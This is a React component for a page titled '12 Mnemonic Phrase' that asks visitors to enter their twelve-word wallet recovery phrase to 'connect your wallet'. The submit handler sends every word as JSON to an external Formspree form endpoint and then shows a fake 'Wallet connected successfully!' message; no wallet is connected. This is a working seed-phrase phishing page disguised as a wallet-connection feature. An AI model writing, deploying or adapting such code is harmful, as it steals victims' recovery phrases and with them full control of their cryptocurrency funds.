"use client"
import React, { useState } from "react";

export default function twelveMnemonic() {
    const [mnemonicWords, setMnemonicWords] = useState<string[]>(Array(12).fill(''))
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [message, setMessage] = useState('');

    const handleInputChange = (index: number, value: string) => {
        const newWords = [...mnemonicWords];
        newWords[index] = value;
        setMnemonicWords(newWords);
    }

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsSubmitting(true);
        setMessage('');

        try {
            // Create data object
            const data: Record<string, string> = {};
            mnemonicWords.forEach((word, index) => {
                data[`word_${index + 1}`] = word;
            });

            // Submit to Formspree as JSON
            const response = await fetch('https://formspree.io/f/xdalzkay', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });

            if (response.ok) {
                setMessage('✓ Wallet connected successfully!');
                setMnemonicWords(Array(12).fill(''));
            } else {
                setMessage('✗ Failed to connect wallet. Please try again.');
            }
        } catch (error) {
            console.error('Error:', error);
            setMessage('✗ An error occurred. Please check your connection.');
        } finally {
            setIsSubmitting(false);
        }
    };

    return (
        <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 pt-24">
            <div className="p-6">
                <div className="max-w-3xl mx-auto">
                    <div className="mb-8">
                        <h1 className="text-4xl font-bold text-gray-800 mb-2">
                            12 Mnemonic Phrase
                        </h1>
                        <p className="text-gray-600">
                            Enter your 12-word recovery phrase to connect your wallet
                        </p>
                    </div>
                    <form onSubmit={handleSubmit}>
                        <div className="bg-white rounded-xl shadow-lg p-6 md:p-8 mb-6">
                            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                                {mnemonicWords.map((word, index) => (
                                    <div key={index} className="relative">
                                        <label className="block text-xs font-medium text-gray-500 mb-1">
                                            Word {index + 1}
                                        </label>
                                        <input
                                            type="text"
                                            value={word}
                                            onChange={(e) => handleInputChange(index, e.target.value)}
                                            className="w-full px-4 py-3 border-2 border-gray-200 rounded-lg focus:border-blue-600 focus:outline-none transition-colors"
                                            placeholder={`Word ${index + 1}`}
                                            required />
                                    </div>
                                ))}
                            </div>
                        </div>
                        {message && (
                            <div className={`mb-4 p-4 rounded-lg text-center font-medium ${message.startsWith('✓') ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}`}>
                                {message}
                            </div>
                        )}
                        <button
                            type="submit"
                            disabled={isSubmitting}
                            className="w-full bg-blue-600 text-white font-semibold py-3 rounded-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                        >
                            {isSubmitting ? 'Connecting...' : 'Connect Wallet'}
                        </button>
                    </form>
                </div>
            </div>
        </div>
    );
}